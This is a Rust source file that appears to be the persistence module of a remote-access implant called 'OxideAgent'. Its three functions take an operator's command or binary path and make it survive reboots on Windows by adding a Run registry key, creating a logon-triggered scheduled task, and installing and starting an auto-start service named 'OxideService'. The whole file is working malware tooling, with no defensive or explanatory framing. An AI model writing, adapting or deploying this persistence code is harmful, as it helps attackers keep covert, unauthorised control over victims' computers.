use anyhow::Result;

pub async fn registry(args: &[String]) -> Result<String> {
    // Write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: reg_persist <command>"));
    }
    let cmd = args.join(" ");

    #[cfg(target_os = "windows")]
    {
        let out = tokio::process::Command::new("reg")
            .args(["add",
                   r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                   "/v", "OxideAgent", "/t", "REG_SZ",
                   "/d", &cmd, "/f"])
            .output().await?;
        if out.status.success() {
            return Ok(format!("[+] Registry persistence set: {cmd}"));
        }
        return Err(anyhow::anyhow!("reg add failed"));
    }
    #[allow(unreachable_code)]
    Ok(format!("registry persist stub: {cmd}"))
}

pub async fn schtask(args: &[String]) -> Result<String> {
    // Create a scheduled task running at logon
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: schtask <command>"));
    }
    let cmd = args.join(" ");

    #[cfg(target_os = "windows")]
    {
        let out = tokio::process::Command::new("schtasks")
            .args(["/create", "/tn", "OxideAgent",
                   "/tr", &cmd,
                   "/sc", "onlogon", "/f"])
            .output().await?;
        if out.status.success() {
            return Ok(format!("[+] Scheduled task created: {cmd}"));
        }
        return Err(anyhow::anyhow!("schtasks failed"));
    }
    #[allow(unreachable_code)]
    Ok(format!("schtask stub: {cmd}"))
}

pub async fn service(args: &[String]) -> Result<String> {
    // Create and start a Windows service
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: service <binary_path>"));
    }
    let bin = &args[0];

    #[cfg(target_os = "windows")]
    {
        let out = tokio::process::Command::new("sc")
            .args(["create", "OxideService", "binPath=", bin,
                   "start=", "auto"])
            .output().await?;
        if out.status.success() {
            tokio::process::Command::new("sc")
                .args(["start", "OxideService"])
                .output().await?;
            return Ok(format!("[+] Service created: {bin}"));
        }
        return Err(anyhow::anyhow!("sc create failed"));
    }
    #[allow(unreachable_code)]
    Ok(format!("service stub: {bin}"))
}
